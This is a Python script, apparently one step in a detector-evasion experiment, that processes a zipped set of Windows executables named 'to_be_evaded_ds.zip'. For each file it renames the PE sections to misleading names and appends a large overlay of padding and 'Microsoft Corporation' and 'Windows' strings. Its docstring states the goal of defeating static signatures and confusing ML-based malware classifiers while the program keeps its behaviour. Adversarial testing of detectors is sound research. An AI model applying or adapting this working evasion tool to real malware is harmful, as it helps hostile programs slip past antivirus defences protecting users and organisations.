#!/usr/bin/env python3
"""
Method B - Section Renaming + Overlay

Technique:
1. Rename PE sections (.text -> .code, .data -> .info, etc.)
2. Add benign overlay with section-like patterns
3. Preserve all imports and functionality

Evasion rationale:
- Section name changes alter static signatures
- Overlay adds benign patterns that confuse ML models
- Behavior completely preserved
"""

import argparse
import csv
import hashlib
import random
import shutil
import time
import zipfile
from pathlib import Path


METHOD_NAME = "methodB_section_rename_overlay"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


# Section name mappings (benign alternatives)
SECTION_MAPPINGS = {
    b".text\x00\x00\x00": b".code\x00\x00\x00",
    b".data\x00\x00\x00": b".info\x00\x00\x00",
    b".rdata\x00\x00": b".read\x00\x00",
    b".rsrc\x00\x00\x00": b".res\x00\x00\x00\x00",
    b".idata\x00\x00": b".import\x00",
    b".edata\x00\x00": b".export\x00",
    b".reloc\x00\x00": b".fixup\x00\x00",
}


def rename_sections(pe_path: Path) -> bool:
    """Rename PE sections to benign alternatives"""
    try:
        import pefile
        pe = pefile.PE(str(pe_path))
        
        renamed_count = 0
        for section in pe.sections:
            old_name = section.Name
            # Find matching replacement
            for old_pattern, new_name in SECTION_MAPPINGS.items():
                if old_name.startswith(old_pattern.rstrip(b"\x00")):
                    section.Name = new_name[:8].ljust(8, b"\x00")
                    renamed_count += 1
                    break
        
        if renamed_count > 0:
            pe.write(str(pe_path))
            pe.close()
            print(f"      ✓ Renamed {renamed_count} sections")
            return True
        
        pe.close()
        return False
    except ImportError:
        return False
    except Exception as e:
        print(f"      Section rename failed: {str(e)[:50]}")
        return False


def add_section_like_overlay(file_path: Path) -> None:
    """Add overlay with section-like patterns"""
    data = file_path.read_bytes()
    
    # Section-like patterns
    section_patterns = [
        b".text\x00\x00\x00" * 1000,
        b".data\x00\x00\x00" * 1000,
        b".rdata\x00\x00" * 1000,
        b".rsrc\x00\x00\x00" * 1000,
        b"Microsoft Corporation\x00" * 500,
        b"Windows\x00" * 2000,
        b"\x00" * 50000,  # Null padding
    ]
    
    overlay_size = random.randint(500_000, 1_500_000)
    overlay = bytearray()
    while len(overlay) < overlay_size:
        overlay.extend(random.choice(section_patterns))
    
    final_data = data + bytes(overlay[:overlay_size])
    file_path.write_bytes(final_data)
    print(f"      ✓ Added {overlay_size:,} bytes overlay")


def section_rename_transform(src: Path, dst: Path) -> None:
    """Apply section renaming + overlay"""
    print(f"    -> Section rename + overlay for {src.name}")
    
    # Copy file
    shutil.copy2(src, dst)
    
    # Try to rename sections
    renamed = rename_sections(dst)
    
    # Always add overlay
    add_section_like_overlay(dst)
    
    if not renamed:
        print("      (Section rename skipped, overlay only)")


def process_files(input_dir: Path, output_dir: Path) -> None:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    files = collect_inputs(input_dir)
    rows = []
    success = 0
    fail = 0

    print(f"Found {len(files)} files")
    for idx, src in enumerate(files, 1):
        print(f"[{idx}/{len(files)}] {src.name}")
        dst = output_dir / src.name
        base_sha = sha256_of(src)
        start = time.time()

        try:
            section_rename_transform(src, dst)
            duration = time.time() - start
            out_sha = sha256_of(dst)
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": out_sha,
                    "status": "OK",
                    "duration_sec": f"{duration:.3f}",
                    "notes": "section_rename+overlay",
                }
            )
            success += 1
        except Exception as exc:
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": "",
                    "status": "FAIL",
                    "duration_sec": "0.000",
                    "notes": f"error: {str(exc)[:120]}",
                }
            )
            fail += 1

    report_file = output_dir / "compare_report.csv"
    with report_file.open("w", newline="") as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=[
                "filename",
                "baseline_sha256",
                "output_sha256",
                "status",
                "duration_sec",
                "notes",
            ],
        )
        writer.writeheader()
        writer.writerows(rows)

    sha_file = output_dir / "sha256sums.txt"
    with sha_file.open("w") as handle:
        for row in rows:
            if row["status"] == "OK":
                handle.write(f'{row["output_sha256"]}  {output_dir / row["filename"]}\n')

    print("\nSummary")
    print("-------")
    print(f"Success: {success} | Fail: {fail} | Total: {len(files)}")
    print(f"Outputs:\n - {report_file}\n - {sha_file}")


def run_pipeline(archive_path: Path, work_root: Path, output_zip: Path) -> None:
    input_dir = work_root / "input"
    output_dir = work_root / "output"
    extract_dataset(archive_path, input_dir)
    process_files(input_dir, output_dir)
    compress_outputs(output_dir, output_zip)
    print(f"\nPackaging complete -> {output_zip}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Method B: Section Renaming + Overlay"
    )
    parser.add_argument(
        "--archive",
        default=str(DEFAULT_ARCHIVE),
        help="Path to the zipped dataset",
    )
    parser.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="Working directory",
    )
    parser.add_argument(
        "--output-zip",
        default=str(DEFAULT_OUTPUT_ZIP),
        help="Output zip file",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    run_pipeline(
        Path(args.archive).expanduser().resolve(),
        Path(args.work_root).expanduser().resolve(),
        Path(args.output_zip).expanduser().resolve(),
    )


if __name__ == "__main__":
    main()

